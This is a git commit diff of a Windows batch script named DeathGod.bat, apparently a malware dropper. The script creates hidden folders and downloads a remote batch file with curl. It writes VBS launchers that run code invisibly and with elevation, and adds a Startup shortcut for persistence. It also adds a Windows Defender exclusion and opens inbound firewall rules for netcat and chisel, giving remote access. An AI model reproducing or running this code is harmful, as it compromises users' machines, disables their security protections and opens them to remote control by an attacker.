1307e5ac75279129c717417894e20484ce1dd895
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-19 00:53:29 -0700

    Update DeathGod.bat

--- DeathGod.bat
+++ DeathGod.bat
@@ -1,23 +1,27 @@
-@echo off
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
-curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat %homedrive%\Akuma\Akuma.bat
-echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\誕生日.vbs
-echo objShell.Run "%homedrive%\Akuma\Akuma.bat", 0, False >> %homedrive%\Akuma\誕生日.vbs
+mkdir %homedrive%\ShiniGami
+attrib +h %homedrive%\ShiniGami
+cd %homedrive%\ShiniGami
+curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat
+echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\死神.vbs
+echo objShell.Run "%homedrive%\ShiniGami\Akuma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
 echo Set objShell = CreateObject("Shell.Application") >> %homedrive%\Akuma\beyondbirthday.vbs
 echo objShell.ShellExecute "%homedrive%\Akuma\beyondbirthday.bat", "", "", "runas", 0 >> %homedrive%\Akuma\beyondbirthday.vbs
+powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
+pause
 echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Akuma" >> %homedrive%\Akuma\beyondbirthday.bat
+echo powershell Remove-NetFirewallRule -Name "Akumanc" >> %homedrive%\Akuma\beyondbirthday.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
+echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %homedrive%\Akuma\beyondbirthday.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\beyondbirthday.bat
-echo start %homedrive%\Akuma\誕生日.vbs >> %homedrive%\Akuma\beyondbirthday.bat
+echo start %homedrive%\Akuma\死神.vbs >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
-echo del %temp%\Akuma.bat >> %homedrive%\Akuma\beyondbirthday.bat
-powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
+pause
 set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
 IF EXIST "%vbsFilePath%" (
     cscript "%vbsFilePath%"
 ) ELSE (
     exit
 )
-exit
